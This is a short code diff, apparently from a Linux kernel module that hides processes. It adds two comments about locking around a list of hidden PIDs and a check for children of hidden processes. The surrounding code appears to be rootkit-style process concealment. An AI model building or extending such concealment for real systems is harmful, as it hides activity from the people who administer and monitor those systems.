@@ -10,6 +10,7 @@
 static int enabled = 0;
 
 //TODO handle task_struct of childs of hidden processes
+//TODO lock task list
 
 static DEFINE_RWLOCK(pids_lock);
 static LIST_HEAD(hidden_pids);
@@ -68,6 +69,8 @@ int is_child(pid_t pid, struct task_struct *task) {
 
 /*
  * Check if pid is a child of one of the hidden processes
+ *
+ * Expects read lock on hidden pids
  *
  * Return 1, if pid is a child, 0 else
  */
